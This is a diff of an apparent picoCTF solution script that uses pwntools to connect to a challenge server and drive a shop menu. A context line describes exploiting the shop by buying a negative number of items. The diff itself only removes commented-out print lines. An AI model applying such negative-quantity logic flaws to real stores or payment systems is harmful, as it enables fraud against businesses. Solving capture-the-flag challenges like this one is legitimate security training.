@@ -6,19 +6,7 @@ by "buying" a negative number of items, you can increase your wealth without eff
 from pwn import *
 
 s = remote('mercury.picoctf.net', 24851)
-'''print(s.recvline())
 
-print(s.recvline())
-print(s.recvline())
-print(s.recvline())
-print(s.recvline())
-print(s.recvline())
-print(s.recvline())
-print(s.recvline())
-
-
-print(s.recvline())
-print(s.recvline())'''
 print(s.recvuntil("Choose an option:"))
 s.sendline("0")
 print(s.recvuntil("How many do you want to buy?"))
